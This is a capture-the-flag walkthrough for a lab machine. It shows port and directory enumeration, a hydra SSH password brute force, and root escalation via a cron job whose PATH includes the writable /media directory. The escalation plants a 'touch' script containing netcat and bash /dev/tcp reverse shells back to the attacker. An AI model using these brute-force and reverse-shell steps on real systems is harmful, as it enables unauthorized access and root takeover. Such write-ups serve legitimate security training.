@@ -1,1 +1,266 @@
+			ENUMERATION
+			
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.74 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-11 16:18 +03
+Nmap scan report for 10.0.2.74
+Host is up (0.0011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
+|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
+|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
+|_auth-owners: root
+80/tcp  open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_auth-owners: moksha
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_/enlightenment
+113/tcp open  ident?
+|_auth-owners: root
+MAC Address: 08:00:27:E7:13:97 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.11 ms 10.0.2.74
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 117.50 seconds
+                                     
+
+
+--- we discover open 22, 80 and 113 ports ---
+
+
+--- 113 port has the service ident ---
+
+
+--- we also discover a name: moksha ---
+
+
+--- let's install and run a tool named ident-user-enum ---
+
+
+Ident-user-enum: Tells us what user(s) those services run as
+
+
+
+
+
+apt install ident-user-enum
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ident-user-enum 10.0.2.74 22 113 139 445
+ 
+ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )
+
+10.0.2.74:22	root
+10.0.2.74:113	root
+10.0.2.74:139	<unknown>
+10.0.2.74:445	<unknown>
+                                  
+
+
+--- we learn that root user runs the ssh and ident services ---
+
+
+
+
+--- dirb --- 
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.74
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Jun 14 00:41:58 2024
+URL_BASE: http://10.0.2.74/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.74/ ----
++ http://10.0.2.74/index.html (CODE:200|SIZE:19)                               
++ http://10.0.2.74/robots.txt (CODE:200|SIZE:25)                               
+                                                                               
+-----------------
+END_TIME: Fri Jun 14 00:42:03 2024
+DOWNLOADED: 4612 - FOUND: 2
+
+
+
+
+--- okay, not much came from the dirb and ident-user-enum ---
+
+
+
+--- let's try the username moksha, utilize a hydra attack ---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# hydra -l moksha -P wordlists/rockyou.txt ssh://10.0.2.74
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-14 01:21:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.0.2.74:22/
+[22][ssh] host: 10.0.2.74   login: moksha   password: hannah
+
+1 of 1 target successfully completed, 1 valid password found
+
+
+
+
+
+--- we got the credentials for ssh server ---
+
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ssh moksha@10.0.2.74
+The authenticity of host '10.0.2.74 (10.0.2.74)' can't be established.
+ED25519 key fingerprint is SHA256:RZdWDCayN2ZJO5rXaVv2OOemeArZ0UbcRoKCoz9lWzA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.74' (ED25519) to the list of known hosts.
+moksha@10.0.2.74's password: 
+Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+
+moksha@hannah:~$ ls
+user.txt
+
+moksha@hannah:~$ cat user.txt
+--- First User Flag ---
+
+
+
+
+--- let's look for ways to priv escalate and search further ---
+
+
+moksha@hannah:/tmp$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+* * * * * root touch /tmp/enlIghtenment
+
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+--- there is a job named enlIghtenment being run by root ---
+
+
+--- I run linpeas.sh and get this ---
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
+
+
+--- so there appears to be a vulnerability here, if we create a file like enlIghtenment that is to be executed in 
+the /media folder, we won't face any privilege restrictions ---
+
+
+--- so I create a file named touch in the /media folder, give it executing permissions and write a reverse shell in it ---
+
+
+			
+			
+			
+			PRIVILEGE ESCALATION
+
+
+
+moksha@hannah:/media$ nano touch
+
+moksha@hannah:/media$ chmod +x touch
+
+moksha@hannah:/media$ cat touch
+#!/bin/bash
+nc -e /bin/bash 10.0.2.54 4040
+
+
+
+
+Note: You don't have to use a netcat reverse shell, I also utilized a bash reverse shell and was able to become root ---
+
+moksha@hannah:/media$ cat touch
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.2.54/4040 0>&1
+
+
+
+
+
+--- now open up a listener and just wait, since this is a cronjob it will be run automatically after some time ---
+
+
+
+──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 4040                        
+listening on [any] 4040 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.74] 56144
+
+whoami
+root
+
+cd /root
+
+ls
+root.txt
+
+cat root.txt
+--- Root User Flag ---
+
+
+
+
+
 
